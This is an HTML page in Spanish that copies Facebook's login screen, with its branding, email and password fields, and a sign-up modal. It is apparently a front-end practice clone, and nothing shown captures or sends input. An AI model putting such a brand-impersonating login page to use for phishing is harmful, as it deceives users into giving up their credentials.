<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <link rel="icon" type="image/x-icon" href="iconfb.ico"> 
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" type="text/css" href="style.css">
    <link href="https://fonts.googleapis.com/css2?family=Mali:wght@500&family=Poppins:wght@500&display=swap" rel="stylesheet">
    <link href="https://fonts.googleapis.com/css2?family=Kanit&display=swap" rel="stylesheet">
    <title>Facebook</title>
</head>
<body>
    <div class="section1">
        <h1>facebook</h1>
        <h2>Facebook te ayuda a comunicarte y compartir con las personas que forman parte de tu vida.</h2>
    </div>
    <div class="section2">
        <form method="post">
            <fieldset>
                <div class="mb-3">
                    <input type="email" class="form-control" id="Email" placeholder="Correo electronico o numero de telefono">
                </div>
                <div class="mb-3">
                    <input type="password" class="form-control" id="Password" aria-describedby="passwordHelpBlock" placeholder="Contraseña">
                </div>
                <button id="button1"><a href="login.html">Iniciar Sesion</a></button>
                <a href="key.html">¿Has olvidado la contraseña?</a>
                <hr class="border">
                <button id="mostrarModal">Crear cuenta nueva</button>
                <div id="miModal" class="modal">
                    <div class="modal-contenido">
                        <span id="cerrarModal" class="cerrar">&times;</span>
                        <div class="text-up">
                            <h2>Registrarte</h2>
                            <h3>Es rápido y facil.</h3>
                        </div>
                        <form>
                            <input type="name" placeholder="Nombre">
                            <input type="lastname" placeholder="Apellidos">
                            <input type="numberMobile" placeholder="Número de móvil o correo electronico">
                            <input type="password" placeholder="Contraseña nueva">
                            <button type="submit">Registrarse</button>
                        </form>
                    </div>
                </div>
                <script src="script.js"></script>
            </fieldset>
        </form>
    </div>
</body>
</html>
